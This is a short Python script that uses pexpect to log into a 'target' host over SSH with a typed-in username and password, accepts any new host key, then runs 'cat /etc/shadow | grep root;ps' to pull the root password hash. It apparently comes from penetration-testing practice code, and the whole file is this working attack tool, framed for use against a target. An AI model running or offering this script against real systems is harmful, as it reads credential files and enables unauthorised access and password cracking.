#!/usr/bin/python

import pexpect

PROMPT=['# ','>>> ','> ','\$ ']

def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before)

def connect(user,host,password):
	ssh_newkey="Are you sure you want to continue connecting"
	constr='ssh'+' '+user+'@'+host
	child=pexpect.spawn(constr)
	ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword'])
	if (ret==0):
		print('error connecting to the host')
		return
	if (ret==1):
		child.sendline('yes')
		ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword'])
		if ret==0:
			print('Error Connecting')
			return
	child.sendline(password)
	child.expect(PROMPT)
	return child
def main():
	host=input('Enter the host to target')
	user=input('Enter the username')
	password=input('Enter the passsword')
	child=connect(user,host,password)
	send_command(child,'cat /etc/shadow | grep root;ps')


main()
